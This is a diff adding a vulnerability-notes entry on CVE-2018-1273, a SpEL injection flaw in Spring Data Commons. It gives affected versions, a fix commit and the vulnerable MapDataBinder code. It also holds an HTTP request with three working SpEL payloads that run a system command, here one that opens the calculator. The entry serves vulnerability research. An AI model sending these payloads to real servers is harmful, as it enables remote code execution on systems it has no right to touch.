@@ -193,3 +193,34 @@ static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, Str
     return value;
 }
 ```
+## Spring Data Commons
+### CVE-2018-1273 SpEL
+Affected Version: < 1.13.11 or < 2.0.6  
+Diff: https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a  
+POC: 
+```
+POST /users?page=&size=5 HTTP/1.1
+
+username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")]=&password=&repeatedPassword=
+
+// other pocs
+username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator')")]=&password=&repeatedPassword=
+username[(#root.getClass().forName("java.lang.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance('shxx-cxxopen -a Calculator'.split('xx'))).start()]=&password=&repeatedPassword=
+```
+Factor: 
+```
+MapDataBinder
+public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {
+    if (!this.isWritableProperty(propertyName)) {
+        throw new NotWritablePropertyException(this.type, propertyName);
+    } else {
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        ...
+        Expression expression = PARSER.parseExpression(propertyName);
+        ...
+        try {
+            expression.setValue(context, value);
+        } ...
+    }
+}
+```
